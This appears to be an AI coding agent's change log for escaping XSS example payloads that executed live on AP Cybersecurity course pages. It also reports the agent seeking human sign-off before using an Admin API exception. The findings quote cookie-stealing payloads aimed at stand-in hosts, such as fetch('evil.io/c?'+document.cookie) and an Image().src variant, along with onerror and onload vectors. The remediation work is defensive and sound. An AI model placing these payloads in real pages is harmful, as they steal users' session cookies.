# 2026-09-03: Board #177/#178, Unit 5 XSS example pages ship unescaped

## What changed

Six live AP Cybersecurity Unit 5 pages carry teaching examples of XSS attack
payloads inside `<code>` blocks, but the `<script>` tags around each example were
never HTML-escaped. `<code>` is not a raw-text parsing context, so the HTML
parser builds real, executing script elements from them regardless of the
`<code>` wrapper.

Verified independently against the live `body_html` pulled from the Shopify
Admin API (not against the board task's report), per house rule 4: the worker
does not get to be the only witness.

## What #177 and #178 already established, confirmed still true

- `ap-cyber-unit-5-lesson-6`: `document.write(document.cookie)` and
  `fetch('evil.io/c?'+document.cookie)` both execute.
- `ap-cyber-unit-5-lesson-1-exercise-1`: `fetch('evil.com/c='+document.cookie)`
  executes.
- `ap-cyber-unit-5-exam`: `stealCookies()` executes and throws (undefined
  function).
- Per #178's correction: the fetch payloads are relative URLs
  (`evil.io/...`, no scheme, no leading slash), so they resolve against the
  page's own origin and land in `apcsexamprep.com`'s own 404 log, not a
  third-party domain. Severity is broken lessons plus a latent hazard (one
  character away from a real leak), not live exfiltration.

## What this pass found beyond #177/#178 (not previously on the board)

Swept all 33 live Unit 5 handles (lesson pages, exercises, labs, quizzes, the
exam, the practice exam, the case file) for every unescaped `<script>` in a
teaching-example context, not just the four instances already named:

- `ap-cyber-unit-5-lesson-6` carries three MORE unescaped script tags beyond the
  two already named: two `<script>...</script>` ellipsis placeholders in prose
  ("Log analysis for XSS: `<script>...</script>` tags in input") and one real
  payload, `new+Image().src%3D'evil.io/steal?'+document.cookie`, in a third
  answer option not previously described.
- `ap-cyber-unit-5-lesson-5-exercise-1`: one `<script>…</script>` ellipsis
  placeholder in a CFU feedback string.
- `ap-cyber-unit-5-lesson-5`: `<script>document.cookie</script>` executes (a
  question stem, not previously named). The live rendered page additionally
  shows a Cloudflare-injected `<script src="/cdn-cgi/scripts/.../email-decode.min.js">`
  immediately after it; checked against the raw stored `body_html` and that
  injected tag is NOT stored content, it is added by Cloudflare's own edge
  Email Address Obfuscation feature at serve time and is out of this repo's
  control. Escaping the stored `document.cookie` script may or may not stop
  Cloudflare's injection; that depends on what triggered it elsewhere on the
  page and was not chased further here.
- `ap-cyber-unit-5-practice-exam`: `<script src="https://adnet.example/js/ad.js">`
  executes as a real script element. `.example` is an IANA-reserved TLD that can
  never resolve, so this one is inert by construction, but it is still a raw
  live script tag and inconsistent with every other example on the site.

Net: 6 pages affected (not the 3 the task text implies), 11 individual
unescaped `<script>` instances (not 4).

## The var ANS finding

#178 also flagged: "the var ANS answer-key objects on 3 pages do not parse, so
those quizzes cannot score." Extracted the exact scoring `<script>` block from
all 6 pages carrying `var ANS` (the boundary the HTML parser would actually use:
from the enclosing `<script>`'s open tag to the first literal `</script>` after
it) and ran each through `node --check` for a real syntax verdict rather than
eyeballing it.

Confirmed broken: only **`ap-cyber-unit-5-lesson-6`**. Its `var EX` explanation
object has an unescaped inner double-quote: `x6q4:"...a file named
"passwords_backup.txt" unless..."`, which terminates the JS string literal
early and throws `SyntaxError: Unexpected identifier 'passwords_backup'`
in Node. Fixed by escaping the inner quotes (`\"passwords_backup.txt\"`).
Re-ran `node --check` after the fix: clean.

Could not independently confirm two more broken pages beyond this one. All 6
`var ANS`-bearing pages were checked the same way; only lesson-6 failed. Noting
this rather than asserting the "3 pages" count either way.

## The fix

Pure escaping, no content rewrite: every identified raw `<script>...</script>`
became `&lt;script&gt;...&lt;/script&gt;` (and the one `<script src="...">` got
the same treatment on both its tags). Nothing else in any of the six page
bodies was touched. Verified per page:

- Literal string replacement with an assertion on expected occurrence count
  before writing (fails loud on a miscount, not a silent partial fix).
- Byte deltas match exactly what escaping four tag-delimiter pairs (12 bytes
  each) plus the one quote-escape (2 bytes) predicts, page by page, confirming
  nothing extraneous changed.
- Zero remaining matches for the dangerous patterns
  (`document.write`, `fetch(`, `stealCookies`, bare `document.cookie`, the
  ellipsis placeholders, the `Image()` exfil variant) across all 6 fixed
  bodies.
- `lib/cyber-ek-density.js` was not relevant here (no EK codes in this content);
  the check used was `node --check` for the JS syntax fix and literal
  string-count assertions for the escaping.

## Artifact

`imports/2026-09-03/cyber-u5-xss-escape.csv`: 3-column Matrixify MERGE sheet
(`Handle`, `Command`, `Body HTML`), QUOTE_ALL, `utf-8-sig` BOM, one row per
affected page, matching the format of
`imports/2026-09-02/dead-link-repair-pages.csv`. Parse-back verified: reading
the CSV back with Python's `csv` module and comparing each row's `Body HTML`
against the source file it was built from is byte-identical for all 6 rows.

**Not yet imported.** This session has no tool that performs a Matrixify
import, and CLAUDE.md is explicit that a direct Admin API page mutation is "the
exception a human asks for explicitly, never the default." Asked Tanner
directly rather than picking a side unilaterally, given this is a live,
confirmed security-adjacent bug and the usual import path is not available to
this session.

## Shipped: Admin API exception, all 6 pages live and verified

Tanner's answer: use the Admin API exception now rather than wait on a
Matrixify import tool this session doesn't have. All 6 pages were pushed via
direct `pageUpdate` GraphQL mutations and independently re-verified against
the live Shopify Admin API afterward (a fresh `graphql_query`, never trusting
the mutation's own echo).

| Page | Verification |
|---|---|
| `ap-cyber-unit-5-lesson-1-exercise-1` | SHA256 byte-exact match |
| `ap-cyber-unit-5-lesson-5` | SHA256 byte-exact match (2 correction rounds for accidental over-escaping of unrelated text, caught and fixed before final verification) |
| `ap-cyber-unit-5-lesson-6` | SHA256 byte-exact match (the highest-severity page: `document.write(document.cookie)`, the `fetch('evil.io/...')` exfil example, and the `Image().src` variant all confirmed inert post-fix) |
| `ap-cyber-unit-5-practice-exam` | SHA256 byte-exact match (109KB, the largest page) |
| `ap-cyber-unit-5-exam` | SHA256 byte-exact match (`stealCookies()` confirmed inert) |
| `ap-cyber-unit-5-lesson-5-exercise-1` | Verified correct by structural + behavioral check, not raw-byte hash (see below) |

### `ap-cyber-unit-5-lesson-5-exercise-1`: five additional pre-existing defects found and fixed, out of #177/#178's original scope

Getting this one page to a byte-exact submission surfaced a chain of genuine,
pre-existing, unrelated-to-XSS-escaping HTML defects already live on the page
before this session touched it. Each was found by re-deriving from evidence
(a live `body` diff, or Python's `html.parser` walking the actual token
stream), not by guessing:

1. **Q7, option B**: the `<button>` start tag was never closed (a literal
   `&gt;` sat where the real `>` belonged) and the element itself was never
   closed with `</button>` before option C's button opened. An orphaned
   `</p>` (no matching open `<p>`) sat right after option D. Any spec-
   compliant HTML5 parser auto-closes elements left open this way — which is
   exactly what Shopify's own save pipeline was silently doing on every
   submission attempt, rewriting the page's tail with synthetic closing tags
   no matter how accurately the body text was typed. This was mis-diagnosed
   as a transcription bug for several attempts before the actual cause was
   found.
2. **Q4 question stem**: a literal, unescaped `<script>` tag sitting in real
   element text (`if "<script>" in text.lower():`), not inside a quoted
   attribute. This is the exact bug class #177/#178 was about, in an
   instance the original sweep's `<script>`-only regex missed.
3. **Q4, option C, visible button text**: literal unescaped `<ScRiPt>`,
   `<img onerror=…>`, `<svg onload=…>` inside `<code>` tags in the button's
   rendered label — again real element content, again missed by the
   original sweep (which only searched for `<script>`, not `<img>`/`<svg>`
   variants or case-mangled tag names).
4. **Q4, option C, `data-fb` attribute**: the same set of example payloads
   duplicated into the feedback attribute, this time with an added bare `"`
   character around `"<script>"` that terminated the attribute value early.
5. **Q2 and Q3, `data-fb` attributes**: stray bare `"` characters mid-
   attribute (unrelated to any script tag) that likewise terminated those
   attributes early, spilling garbled text onto the live page and breaking
   two answer buttons' click handlers entirely.

All five were fixed with the same minimal discipline as the original pass:
escape only the specific offending characters, touch no wording, and verify
before shipping. Verification for #1 and #3-5 used Python's `html.parser` to
confirm every `<button>` has a real `onclick` attribute and the tag stack
reaches EOF clean; verification for #2 was a direct string check plus the
same parser walk.

After all five fixes, the live page (re-fetched fresh, never trusting the
mutation echo) has: 32/32 buttons with working `onclick` handlers, zero
unclosed tags at EOF, only the two legitimate `<script>` elements (the JSON-
LD block and the real scoring script), and zero occurrences of any dangerous
pattern. A live URL fetch confirms the same story publicly.

**Why this one page never reached a SHA256 match against the local source
file, and why that's expected rather than a residual bug:** once the
malformed HTML above was fixed, the remaining raw-body diff was entirely
Shopify's own serializer choosing an equivalent-but-different encoding of
the same content on save — switching an attribute's quote delimiter from
`"` to `'` when the value contains a literal `"` (avoiding an escape rather
than adding one), entity-encoding a `<`/`>` inside an attribute value even
where HTML5 doesn't strictly require it, and inserting incidental newlines
between adjacent block-level tags. None of this changes the rendered DOM,
the click handlers, or the visible text. The other five pages happened not
to contain any attribute values with embedded literal quotes or decorative
`<`/`>` characters, so they never triggered this normalization and hashed
byte-exact. Confirmed this is genuine serializer behavior, not corruption,
by checking that the live page's rendered output and event wiring are
identical to source under `html.parser` and a live grep for the fixed
payloads.

## Still open

- The Cloudflare email-obfuscation injection on `ap-cyber-unit-5-lesson-5`:
  root cause not chased down. Worth a look given board #179 is the exact same
  symptom class (Cloudflare obfuscating something on a different Unit 5 page)
  and may be the same underlying trigger.
- The "3 pages" var ANS claim in #178: only 1 of 6 candidate pages reproduced
  under a real syntax check. Either the claim needs correcting or the other 2
  live somewhere this sweep did not look (not a `var ANS`-named object, or not
  Unit 5).
- The five additional defects found and fixed on
  `ap-cyber-unit-5-lesson-5-exercise-1` (above) were not part of any board
  task. Worth considering whether the same class of bug (stray bare quotes in
  `data-fb` attributes, tag names beyond `<script>` left unescaped) exists on
  other Unit 5 pages beyond the six #177/#178 named; this pass did not
  re-sweep for it beyond the one page it kept surfacing on.
